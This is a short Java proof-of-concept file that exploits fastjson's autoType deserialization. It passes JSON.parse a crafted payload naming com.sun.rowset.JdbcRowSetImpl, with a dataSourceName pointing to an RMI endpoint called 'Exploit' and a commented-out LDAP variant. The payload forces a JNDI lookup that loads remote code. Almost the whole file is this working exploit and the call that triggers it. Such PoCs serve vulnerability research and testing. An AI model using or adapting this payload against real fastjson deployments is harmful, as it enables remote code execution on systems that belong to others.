package person;

import com.alibaba.fastjson.JSON;

/**
 * Created by liaoxinxi on 2017-9-4.
 */
public class JdbcRowSetImplPoc {
    public static void main(String[] argv){
        testJdbcRowSetImpl();
    }
    public static void testJdbcRowSetImpl(){
        //        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\"," +
//                " \"autoCommit\":true}";
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\"," +
                " \"autoCommit\":true}";
        JSON.parse(payload);
    }

}
